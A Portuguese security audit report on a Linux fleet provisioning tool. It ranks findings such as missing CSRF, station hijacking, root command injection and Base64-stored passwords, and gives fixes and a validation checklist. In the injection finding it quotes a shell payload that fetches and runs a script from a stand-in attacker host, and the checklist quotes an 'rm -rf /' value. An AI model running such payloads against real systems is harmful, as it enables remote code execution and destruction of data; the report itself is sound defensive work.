# Auditoria Técnica e de Segurança — SeederLinux Lite

**Data:** 04/09/2026 · **Ambiente auditado:** base importada (branch `base44/setup-950e9d43`) · **Método:** análise estática manual (PHP, JS, Bash, Python, SQL) + testes dinâmicos contra a API em execução

---

## 1. Sumário executivo

O MVP está funcionalmente avançado, mas **não está pronto para produção assistida**. A auditoria identificou **6 vulnerabilidades críticas (P0)**, **9 altas (P1)**, **11 médias (P2)** e **7 baixas (P3)**. Três achados P0 foram **comprovados dinamicamente** (executados contra a API real, sem autenticação ou contornando controles):

| # | Achado | Prova |
|---|--------|-------|
| P0-1 | Bundles truncados: `exit` no nível raiz de 5 scripts core interrompe os scripts seguintes | `grep ^exit` + lógica de concatenação em `handleGenerateBundle` |
| P0-2 | Agente não consegue baixar bundles (token de estação rejeitado) | `curl` → HTTP 401 |
| P0-3 | Sequestro de estação sem autenticação (por hostname) | `curl` → `serial_aplicado` alterado de 0 para 999 |
| P0-4 | Endpoints de escrita sem CSRF (provado criando usuário admin) | `curl` → `success:true` sem token CSRF |
| P0-5 | Injeção de comandos root via variáveis/placeholder no bundle | Análise de fluxo (variables-update → generate-bundle → execução root) |
| P0-6 | Senhas de AD/VNC em Base64 embutidas no bundle | `schema.sql:107,189` + `core_vnc.sh:33` |

A causa raiz da maioria dos achados é **arquitetural**: `api/index.php` é um front-controller monolito de 3.957 linhas onde autenticação, autorização e CSRF são decididos *dentro* de cada handler, sem middleware uniforme — os endpoints do mirror (bem protegidos) conviveram por meses na mesma arquivo com endpoints totalmente desprotegidos.

---

## 2. Metodologia

1. **Análise estática manual** de: `api/index.php` (3.957 linhas, leitura integral dos handlers críticos), `lib/{config,db,functions}.php`, `api/download.php`, `assets/js/admin.js` (3.590 linhas, varredura de sinks XSS), `downloads/agent.py` (488 linhas, leitura integral), `scripts/mirror-sync.sh` (184 linhas, leitura integral), os 22 scripts de `scripts/core/` (varredura de `exit`, `set -e`, decodagem de segredos), `install/{install.sh,schema.sql,insert_core_scripts.sql}`, `.htaccess`, `.env.example`.
2. **Varredura de padrões**: `exec/shell_exec/system`, concatenação SQL, `base64`, `csrf`, `innerHTML`, `localStorage`.
3. **Testes dinâmicos** contra a instância em execução (Docker): login com credencial default, checkin anônimo, download de bundle com token de estação, mutação de estado sem CSRF, sequestro de estação.
4. **Não executado** (recomendado como etapa seguinte): SonarQube, PHPStan, ShellCheck, Bandit, ESLint em pipeline de CI — nenhum dos achados abaixo depende deles, mas a regressão futura sim (ver seção 8).

---

## 3. Vulnerabilidades críticas (P0)

### P0-1 · Bundle truncado por `exit` prematuro — os últimos scripts nunca executam
**Arquivo:** `api/index.php` (`handleGenerateBundle`, concatenação em ~2604–2610) + `scripts/core/*.sh`

O gerador concatena o conteúdo dos scripts **direto em um único arquivo Bash**, sem isolamento (sem função, sem subshell). Cinco scripts core terminam com `exit` no nível raiz:

- `core_logon.sh:187` — `exit 0`
- `core_logoff.sh:145` — `exit 0`
- `core_password_change.sh:130` — `exit $?`
- `core_session_gdm3.sh:193` — `exit "${EXIT_STATUS:-0}"`
- `core_session_sddm.sh` — mesmo padrão

Com a ordem oficial (`core_dns → … → core_logon → core_password_change → core_logoff → session_* → core_agent → core_proxy`), o `exit 0` do `core_logon.sh` **encerra o processo Bash no meio do bundle**: troca de senha, logoff, sessões, agente e proxy **nunca rodam em nenhum provisionamento**. O bundle termina "com sucesso" silenciosamente.

**Correção (prioridade máxima):** envolver cada script em uma função e chamá-la (`run_core_logon() { … }; run_core_logon`), ou prefixar cada bloco com `( cd / && bash -c '…' )` em subshell, ou remover os `exit` de nível raiz dos scripts (retornar status). Recomendo também `set -euo pipefail` controlado por script com captura de status por bloco.

### P0-2 · Fluxo do agente quebrado: token de estação não é aceito no download do bundle
**Arquivos:** `downloads/agent.py:download_bundle` vs. `lib/functions.php:requireAuth`

O agente chama `api/?action=bundle-by-id` com `Authorization: Bearer <station_token>`. O `requireAuth()` só verifica tokens em `user_tokens` (tabela de usuários) — tokens de estação vivem em `stations.token` e **nunca conferem**, caindo no fallback de sessão (inexistente no agente).

**Prova dinâmica:** check-in anônimo retornou token válido; `curl bundle-by-id` com esse token → **HTTP 401 "Autenticacao necessaria"**. Resultado: sempre que `update_available=true` com `latest_bundle_id` definido, o agente falha o download — **a atualização automática das estações não funciona**.

**Correção:** em `requireAuth` (ou num `requireStationAuth` dedicado), aceitar tokens de estação via lookup direto em `stations.token` (que deveria ser hash — ver P2-3) e autorizar `bundle-by-id`/`sync-*` para a OM da estação.

### P0-3 · Sequestro e poluição de estações sem qualquer autenticação
**Arquivo:** `api/index.php:handleStationCheckin (2839+)`

O endpoint `checkin` é público por design (precisa ser — a estação precisa se registrar), mas:
1. **Sem token:** a estação é localizada por `hostname` (com MAC opcional) — qualquer um que conheça/sprove o hostname de uma estação real **assume seu registro**;
2. Um check-in anônimo com sigla de OM válida **registra estações falsas** no inventário (poluição);
3. `serial_aplicado` é aceito do cliente sem verificação.

**Prova dinâmica:** `POST checkin {"hostname":"audit-probe-01","ip_address":"1.2.3.4","serial_aplicado":999}` (sem token) → `success:true`, `serial_aplicado: 999` — a estação nunca mais receberia atualização (`update_available:false`).

**Correção:** exigir token para qualquer estação já registrada (o token é emitido no primeiro check-in e persistido pelo agente); recusar re-vinculação por hostname; limitar registros por OM/IP; normalizar/validar hostname (`^[a-zA-Z0-9-]{1,63}$`).

### P0-4 · CSRF ausente em todos os endpoints de escrita, exceto mirror
**Arquivos:** `api/index.php` (switch, linhas 40–400) + `lib/functions.php:requireCsrfToken`

`requireCsrfToken()` existe e é sólido (hash_equals), mas **só é invocado por `requireMirrorAdmin()`**. Criar/excluir OMs, criar usuários (inclusive com role `admin_gap`), gerar bundles, alterar variáveis, uploads, `set-public-theme`, `update-script-order`, versionamento de scripts — tudo sem CSRF. A sessão PHP também não declara `SameSite` explícito.

**Prova dinâmica:** `POST set-public-theme` e `POST users` (criando `admin_gap`) **sem token CSRF** → `success:true` nos dois.

**Correção:** exigir CSRF em todo endpoint que muda estado (POST/PUT/DELETE), da mesma forma que o mirror já faz; `session_set_cookie_params(['httponly'=>true,'samesite'=>'Lax','secure'=>true])`; verificar método HTTP explicitamente em `logout` (hoje aceita GET).

### P0-5 · Injeção de comandos root na frota via variáveis/placeholder
**Arquivos:** `lib/functions.php:substituir_placeholders` + `api/index.php:handleUpdateVariables/handleGenerateBundle`

O valor de qualquer variável da OM é inserido no corpo dos scripts por `str_replace` **sem nenhuma validação ou escaping de shell**. A sanitização existe apenas para uma lista fixa (`SSH_GROUPS`, `DC_IP_LIST`, `NTP_SERVER`, `HOMEPAGE`, URLs). Um `operador_om` — perfil de menor privilégio — pode salvar uma variável com valor `; curl http://atacante/x.sh | bash ;` que será executada **como root em toda a frota** da OM no próximo bundle. Os `export VAR='…'` são escapados corretamente (aspas simples), mas a substituição `{{VARIAVEL}}` dentro dos scripts é crua.

**Correção:** allowlist de formatos por tipo (`type` já existe no catálogo: IP, URL, integer, boolean… — aplique de verdade); rejeitar valores com metacaracteres de shell em tipos string; idealmente interpolar variáveis apenas via `export` e trocar os placeholders `{{X}}` por leitura das variáveis de ambiente nos scripts.

### P0-6 · Senhas de AD e VNC "protegidas" por Base64
**Arquivos:** `install/schema.sql:107 (ADMIN_PASSWORD_B64), :189 (VNC_PASSWORD_B64)`, `api/index.php:2536–2558`, `scripts/core/core_vnc.sh:33`

Base64 é codificação, não criptografia. A senha do administrador de domínio trafega e **fica gravada em texto reversível** dentro de: banco (`organization_variables`), bundle (`deploy_bundles.content`, retido indefinidamente), estação (arquivo em `/var/cache/seeder/bundle.sh`), e é baixável por qualquer `operador_om` da OM via `bundle-by-id`. A senha do AD de domínio militar na mão de um operador de nível básico é o pior achado do relatório em impacto real.

**Correção:** (a) eliminar a necessidade da senha de admin no script de ingresso — usar conta de serviço dedicada com privilégios mínimos de join, ou princípio de "one-time secret" entregue por canal à parte; (b) se mantido, cifrar em repouso com chave fora do banco (libsodium, envelope), nunca embutir no bundle (buscar via endpoint autenticado da estação, em memória); (c) rotação com `bumpOrgSerial`.

---

## 4. Vulnerabilidades altas (P1)

| # | Achado | Evidência | Recomendação |
|---|--------|-----------|--------------|
| P1-1 | **XSS armazenado no painel**: `sanitizeInput()` é só `trim()`; 51 usos de `innerHTML` em `admin.js` com dados de API (nomes/descrições de OM, variáveis, conteúdo de script) | `lib/functions.php:sanitizeInput`; `grep innerHTML assets/js/admin.js` = 51 | Escapar na renderização (helper `escapeHtml`) ou usar `textContent`; CSP no `.htaccess` |
| P1-2 | **Sem assinatura/integridade dos bundles** (pergunta 5): o agente executa o que baixar, como root, sem checksum/assinatura | `agent.py:execute_bundle` | SHA-256 do bundle no `checkin` + verificação no agente; idealmente assinatura GPG/minisign com chave pública no agente |
| P1-3 | **`--no-check-certificate` no agente** + opção em `agent.conf`: MITM = RCE root na estação | `agent.py:create_ssl_context`, `--no-check-certificate` | Remover flag de produção; exigir CA interna empacotada; nunca logar opção em prod |
| P1-4 | **Sessão sem hardening**: `session_start()` sem cookie params (`httponly`, `secure`, `samesite`) e sem `session_regenerate_id` no login (fixação de sessão) | `lib/config.php:2`; `handleLogin` | `session_set_cookie_params` + regenerate no login |
| P1-5 | **CORS `Access-Control-Allow-Origin: *`** na API, com `Authorization` liberado | `api/index.php:23–25` | Restringir à origem do painel; o preview/Base44 pode receber origem via env |
| P1-6 | **Upload de SVG normalizado como aceitável**: `handleUploadLogo` converte detecção `text/xml`→`image/svg+xml` e grava em `assets/logos/` servido direto — SVG com script = XSS | `api/index.php:3176+` | Remover SVG ou servir com `Content-Type` forçado + `Content-Security-Policy` + `X-Content-Type-Options`; sanitizar XML |
| P1-7 | **`requireAuth` O(n) com `password_verify` por token não expirado** — cada request Bearer varre a tabela inteira; também impede tokens de estação (P0-2) | `lib/functions.php:requireAuth` | Guardar `token_hash` com lookup por prefixo (hash SHA-256 do token como chave) ou token_id+hash; purge de tokens expirados |
| P1-8 | **Rate limit de login usa `audit_events` + `REMOTE_ADDR`**: atrás de proxy reverso todos compartilham 1 IP (lockout global possível); auditoria e controle de acesso misturados; sem índice composto | `handleLogin:415+`; `schema.sql` (índices de `audit_events`) | Tabela dedicada `login_attempts` com TTL; confiar em `X-Forwarded-For` só se proxy configurado; índice `(action, ip_address, created_at)` |
| P1-9 | **Operador pode enviar script com `is_core=true`** — um `operador_om` converte script próprio em **global** (`is_core OR organization_id`), afetando bundles de todas as OMs | `api/index.php:handleUploadScript:2311–2313` | `is_core` exclusivo de `admin_gap`; validar no servidor, não confiar no POST |

---

## 5. Vulnerabilidades médias (P2)

| # | Achado | Evidência | Recomendação |
|---|--------|-----------|--------------|
| P2-1 | `CURLOPT_SSL_VERIFYPEER => false` no `mirror-estimate` | `api/index.php:1075–1083` | Verificar TLS sempre (militar atrás de MITM é cenário real) |
| P2-2 | Erros de PDO vazam mensagem, arquivo e linha ao cliente | `handleLogin`, `handleCreateOrganization`, `handleListBundles` etc. | Mensagem genérica + log interno |
| P2-3 | Token de estação em texto plano no banco (`stations.token TEXT UNIQUE`) | `schema.sql:384` | Hash como `user_tokens` (o valor só precisa ser comparado) |
| P2-4 | **Logs de auditoria não imutáveis** (pergunta 12): sem hash-chain/WORM; `admin_gap` com acesso SQL altera sem rastro; sem retenção/partição; spam de `LOGIN_FAILED` infla a tabela | `schema.sql:395+`; `handleLogin` | Trigger de append-only + role de banco só-INSERT; retenção/partição mensal; separar rate-limit da auditoria |
| P2-5 | `deploy_bundles` sem retenção — conteúdo integral (com P0-6) acumula para sempre | `grep DELETE FROM deploy_bundles` só no delete manual | Política de retenção (ex. 90 dias) + purge periódico |
| P2-6 | `exec()` do worker do mirror roda como usuário do web server (`www-data`), que também é dono do mirror (install chown) — servidor web comprometido = supply-chain para as estações | `api/index.php:762–777`; `install/install.sh:251–252` | Worker via systemd/sudo com usuário dedicado; www-data sem posse do mirror |
| P2-7 | Sem `set -e`/coleta de status por script no bundle: erro em script não interrompe (bom) mas **também não é reportado** — estação confirma serial mesmo com falhas | `handleGenerateBundle` | Status por script enviado no check-in seguinte; bloquear confirmação de serial se script essencial falhou |
| P2-8 | `logout` aceita GET e sem CSRF — logout forçado de terceiros + log de auditoria forjável (registra `LOGOUT` de "sistema" para qualquer chamador) | `handleLogout` | Exigir POST + CSRF |
| P2-9 | Headers de segurança incompletos: sem CSP, sem HSTS; `X-XSS-Protection` é obsoleto | `.htaccess` | CSP restritiva, HSTS, `Referrer-Policy`, `Permissions-Policy` |
| P2-10 | Sem limite de payload/normalização no checkin — inventário inflável em loop (DoS leve) | `handleStationCheckin` | Rate limit por IP + validação de campos |
| P2-11 | `mirror-sync.sh` interpola `distro_name`/`source_url` do banco em nomes de mirror e arquivo de config do aptly/apt-mirror sem validação forte (admin-only, mas defense-in-depth) | `scripts/mirror-sync.sh:run_aptly/run_apt_mirror` | Allowlist de formato `^[a-zA-Z0-9._-]+$` e URL `https://` |

---

## 6. Vulnerabilidades baixas (P3)

| # | Achado | Recomendação |
|---|--------|--------------|
| P3-1 | Índices faltantes: `audit_events(action, ip_address, created_at)` (rate limit faz seq scan por login) e `stations(hostname)` (lookup do checkin) | Criar índices |
| P3-2 | `memory/test_credentials.md` documenta a senha default no repo (bloqueada pelo `.htaccess` mas presente no Git) | Remover do repo; forçar troca no primeiro login (`must_change_password`) |
| P3-3 | Política de senha: mínimo de 6 caracteres — fraco para ambiente militar | 12+ com classe de caracteres; breached-password check |
| P3-4 | `lib/config.php:24` — fallback `DB_PASS=seeder123` hardcoded | Remover fallback; falhar alto e claro se `.env` ausente |
| P3-5 | Dupla autenticação paralela (sessão + Bearer 24h) com logout que apaga **todos** os tokens do usuário (todos os dispositivos) | Logout seletivo por token |
| P3-6 | `sanitize_org_urls`/URLs mágicas com strings fixas ("softwarelivre", "om.local") espalhadas | Centralizar constantes |
| P3-7 | Arquivos legados no repo: `lixeira/`, `public/assets/js/script copy.js`, `public/index copy.php` | Limpar (o "copy" reintroduz código morto) |

---

## 7. Respostas às 12 perguntas

1. **Falhas no authn/authz?** Sim — P0-2 (token de estação), P0-3 (checkin), P0-4 (CSRF), P1-7 (verificação O(n)), P1-9 (escalonamento de escopo por `is_core`). O modelo de roles em si (admin_gap/operador_om/auditor) está bem segregado *onde é checado*, mas as checagens são inconsistentes por handler.
2. **Injeção (SQL/XSS/command)?** SQL: **não** — prepared statements com placeholders em todo o trecho auditado; os `{$where}`/`{$placeholders}` montados são de internos confiáveis. XSS: **sim** (P1-1). Command injection: **sim, a mais grave** (P0-5), com a agravante de executar como root na frota.
3. **Senhas AD/VNC em Base64 são seguras?** **Não.** Base64 é reversível por definição; a senha do AD está acessível a operadores via bundle (P0-6).
4. **CSRF cobre os endpoints que mudam estado?** **Não** — apenas os `mirror-*` (P0-4, provado criando um usuário `admin_gap` sem token).
5. **Integridade dos bundles é suficiente?** **Não existe** — sem checksum, sem assinatura, e o agente aceita desligar verificação TLS (P1-2, P1-3).
6. **Mirror vulnerável a path traversal/DoS?** Path traversal no mirror: **não** — `mirror_base_path` é travado após primeiro job (`path_locked`), o worker valida `JOB_ID` numérico e o estimate usa allowlist de hosts. DoS: **parcial** — estimate baixa índices upstream sem cache além de 1h e o sync pode encher disco (há `disk_free_gb` reportado, mas nenhum freio automático); P2-11 por interpolação de strings.
7. **Agente permite execução remota/escalonamento?** O agente em si exige root (by design) e roda bundle sem verificação (P1-2/3 = RCE por MITM ou servidor comprometido). O token fica em `/etc/seeder/station_token` com 0600 — correto.
8. **Ordem de execução correta? Sem interrupção prematura?** A ordem está correta, mas há **interrupção prematura garantida**: `exit` de nível raiz em 5 scripts core trunca todo bundle (P0-1) — os últimos ~7 scripts nunca rodam.
9. **Gargalos de performance?** `requireAuth` O(n) por request (P1-7); rate limit de login com seq scan (P3-1); geração de bundle faz N queries `resolveScriptSourceMetadataForOrg` + `substituir_placeholders` refaz a query de variáveis **por script** (22×) — cachear por request.
10. **Documentação alinhada?** Parcialmente. `STATUS.md` marca como ✅ itens quebrados na prática (autenticação do agente — P0-2; "ordem oficial" — P0-1). `MIRROR.md`/`SERVIDOR.md` razoáveis. Existe um `AUDITORIA.md` antigo no repo — este relatório o substitui. A documentação **não menciona** que o fluxo agente→download está quebrado.
11. **Hardening recomendado?** Seção 9 abaixo.
12. **Auditoria completa e imutável?** Completa em cobertura de ações (bom!), **não imutável** (P2-4) e sem retenção definida.

---

## 8. Recomendações arquiteturais

1. **Quebrar o monólito `api/index.php`** em módulos por domínio (`api/auth.php`, `api/orgs.php`, `api/bundles.php`, `api/mirror.php`, `api/stations.php`) com um roteador e **middleware único** de auth+CSRF+roles — o padrão inconsistente que produziu P0-4 é estrutural.
2. **Pipeline de CI** com ShellCheck (22 core scripts), PHPStan (nível ≥6), Bandit (agent.py), ESLint e os testes de regressão existentes em `backend/tests/` — mais os testes da seção 10.
3. **Assinatura de bundles**: `minisign`/GPG com chave de assinatura no servidor (fora do reach do www-data, ver P2-6) e chave pública embarcada no agente; SHA-256 no manifesto do check-in.
4. **Segredos**: eliminar Base64 (P0-6), mover credenciais para o env gerenciado (já existe `/run/base44/app.env` no ambiente Base44), remover fallbacks hardcoded (P3-4).
5. **Estações como identidade de primeira classe**: endpoints `/api/station/*` com token hash, sem aceitar hostname como identidade.

## 9. Hardening de produção (pergunta 11)

- Apache: TLS com HSTS (`max-age=31536000; includeSubDomains`), desabilitar `TraceEnable`, `ServerTokens Prod`, `ServerSignature Off`.
- PHP: `display_errors=Off` (já ok em `config.php`), `expose_php=Off`, `session.cookie_secure=1`, `open_basedir` para o diretório da aplicação, `disable_functions=system,passthru,popen,proc_*` (mantendo `exec` apenas se o worker do mirror exigir — preferir systemd).
- PostgreSQL: usuário da app sem ownership de schema, apenas DML; usuário separado para migrações; `log_statement=ddl`; listener restrito; backup + teste de restore; pgAudit se exigência militar.
- Permissões: `.env` 600 (ok no install.sh:255), mirror fora do alcance do www-data (P2-6), `storage/` revisado.
- Rede: mirror e API só em `intraer`; firewall por OM se multi-organizacional real.

## 10. Checklist de validação pós-correção

- [ ] Bundle gerado contém os 23 blocos de script e executa até o fim (testar com `bash -n` + execução em VM: `grep -c '^# ---' bundle.sh` ≥ 22).
- [ ] Agente novo baixa bundle com token de estação e executa (teste de ponta a ponta em VM).
- [ ] `POST` de escrita sem `X-CSRF-Token` → 400 em **todos** os endpoints (varredura automatizada da lista de actions).
- [ ] Variável com `; rm -rf /` rejeitada no `variables-update`.
- [ ] `checkin` com hostname alheio e sem token → 401/403.
- [ ] `grep -rn "ADMIN_PASSWORD_B64\|VNC_PASSWORD_B64"` não retorna embutimento em bundle.
- [ ] Login como `operador_om` não cria script `is_core=true` (403).
- [ ] Logout via GET → 405.
- [ ] Cookie de sessão com `HttpOnly; Secure; SameSite=Lax`.
- [ ] `psql -c "SELECT count(*) FROM user_tokens WHERE expires_at < NOW()"` com job de purge.
- [ ] ShellCheck sem erros em `scripts/core/*.sh` (com warnings aceitos documentados).
- [ ] Teste de restore de backup do PostgreSQL.
- [ ] Rescan deste relatório: P0/P1 zerados antes de "produção assistida".

---

**Parecer final:** o produto está funcionalmente maduro, mas **não deve ir a produção assistida antes de fechar os 6 P0** — em particular P0-1 (bundles truncados) e P0-2 (agente quebrado) comprometem a proposta de valor central; P0-5/P0-6 comprometem a postura de segurança em ambiente militar. Estimativa de esforço para os P0: 2–4 dias de um desenvolvedor sênior, mais 1 dia de testes de regressão.
